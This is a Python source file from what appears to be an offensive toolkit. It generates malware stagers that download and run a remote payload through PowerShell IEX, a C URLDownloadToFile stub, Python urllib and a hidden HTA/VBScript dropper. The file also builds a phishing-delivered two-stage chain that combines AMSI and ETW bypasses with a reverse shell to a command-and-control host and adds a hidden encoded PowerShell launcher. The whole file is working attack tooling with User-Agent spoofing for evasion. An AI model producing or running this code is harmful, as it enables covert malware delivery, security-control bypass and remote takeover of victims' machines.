"""HTTP/HTTPS stager — tiny first-stage that downloads and executes the real payload.

The stager is kept as small as possible (minimal footprint):
    - No complex decoding — just download + execute
    - HTTPS preferred (TLS terminates at CDN/domain fronting)
    - Random User-Agent rotation
    - Proxy-aware (uses system proxy)

Supported stager types:
    - ps1_download: PowerShell one-liner (smallest)
    - c_download:   C stub with URLDownloadToFile
    - python_download: Python urllib
    - hta_download: HTA + VBScript download

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import random

# Common legitimate User-Agents for blending in
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Microsoft-CryptoAPI/10.0",
    "WinHttp-Autoproxy-Service/5.1",
]


def generate_http_stager(
    stage_url: str,
    stager_type: str = "ps1_download",
    use_proxy: bool = True,
    user_agent: str = "",
) -> str:
    """Generate an HTTP stager for the given stage URL.

    Args:
        stage_url:    URL of the second-stage payload.
        stager_type:  'ps1_download', 'c_download', 'python_download', 'hta_download'.
        use_proxy:    Use system proxy settings.
        user_agent:   Override User-Agent header.

    Returns:
        Stager code string.
    """
    ua = user_agent or random.choice(_USER_AGENTS)

    if stager_type == "ps1_download":
        return _ps1_http_stager(stage_url, ua, use_proxy)
    elif stager_type == "c_download":
        return _c_http_stager(stage_url, ua)
    elif stager_type == "python_download":
        return _python_http_stager(stage_url, ua)
    elif stager_type == "hta_download":
        return _hta_http_stager(stage_url, ua)
    else:
        return _ps1_http_stager(stage_url, ua, use_proxy)


def _ps1_http_stager(url: str, ua: str, use_proxy: bool) -> str:
    """PowerShell download + IEX stager."""
    proxy_line = "$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()\n$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials" if use_proxy else ""
    return f"""\
# Forge Suite v5 APEX — HTTP Stager (PS1)
$wc=New-Object System.Net.WebClient
{proxy_line}
$wc.Headers.Add('User-Agent','{ua}')
IEX($wc.DownloadString('{url}'))
"""


def _c_http_stager(url: str, ua: str) -> str:
    """C URLDownloadToFile stager."""
    return f"""\
// Forge Suite v5 APEX — HTTP Stager (C)
#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int n) {{
    HINTERNET hInet = InternetOpen(L"{ua}",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    strcat(tmp, "\\update.exe");
    if (URLDownloadToFileA(NULL, "{url}", tmp, 0, NULL) == S_OK) {{
        STARTUPINFOA si = {{0}}; PROCESS_INFORMATION pi = {{0}};
        si.cb = sizeof(si);
        CreateProcessA(tmp, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }}
    return 0;
}}
"""


def _python_http_stager(url: str, ua: str) -> str:
    """Python urllib download + exec stager."""
    return f"""\
#!/usr/bin/env python3
# Forge Suite v5 APEX — HTTP Stager (Python)
import urllib.request, tempfile, os, subprocess
req = urllib.request.Request('{url}', headers={{'User-Agent': '{ua}'}})
with urllib.request.urlopen(req, timeout=30) as r:
    data = r.read()
tmp = tempfile.mktemp(suffix='.exe')
with open(tmp, 'wb') as f:
    f.write(data)
os.chmod(tmp, 0o755)
subprocess.Popen([tmp], close_fds=True)
"""


def _hta_http_stager(url: str, ua: str) -> str:
    """HTA VBScript download + exec stager."""
    return f"""\
<html><head><HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"></head>
<body>
<script language="VBScript">
Dim oXML, oStream, sTemp
Set oXML = CreateObject("Microsoft.XMLHTTP")
oXML.Open "GET", "{url}", False
oXML.setRequestHeader "User-Agent", "{ua}"
oXML.Send
sTemp = Environ("TEMP") & "\\update.exe"
Set oStream = CreateObject("ADODB.Stream")
oStream.Type = 1
oStream.Open
oStream.Write oXML.ResponseBody
oStream.SaveToFile sTemp, 2
oStream.Close
Set oShell = CreateObject("WScript.Shell")
oShell.Run sTemp, 0, False
window.close()
</script>
</body></html>
"""


def generate_multistage_chain(
    lhost: str,
    lport: int,
    stage1_url: str,
    stage2_url: str,
) -> dict[str, str]:
    """Generate a complete 2-stage delivery chain.

    Stage 1 (tiny, in phishing attachment):
        PS1 one-liner / HTA → downloads Stage 2

    Stage 2 (second-stage loader on C2 web server):
        PS1 with AMSI bypass + shellcode loader → downloads beacon

    Args:
        lhost:      C2 host for final beacon.
        lport:      C2 port.
        stage1_url: URL for stage 2 download (from stage 1).
        stage2_url: URL for beacon download (from stage 2).

    Returns:
        Dict with 'stage1' and 'stage2' stager code strings.
    """
    stage1 = _ps1_http_stager(stage1_url, random.choice(_USER_AGENTS), use_proxy=True)

    from forge_payload.formats.ps1_builder import (
        _AMSI_BYPASS_REFLECTION, _ETW_BYPASS, _PS1_REVERSE_SHELL
    )
    stage2_body = (
        "# Forge Suite v5 APEX — Stage 2 Loader\n"
        + _AMSI_BYPASS_REFLECTION
        + _ETW_BYPASS
        + _PS1_REVERSE_SHELL.format(lhost=lhost, lport=lport)
    )
    b64_stage2 = base64.b64encode(stage2_body.encode("utf-16-le")).decode()

    return {
        "stage1": stage1.strip(),
        "stage2": stage2_body.strip(),
        "stage2_b64_launcher": f"powershell.exe -NoP -NonI -W Hidden -Enc {b64_stage2}",
    }
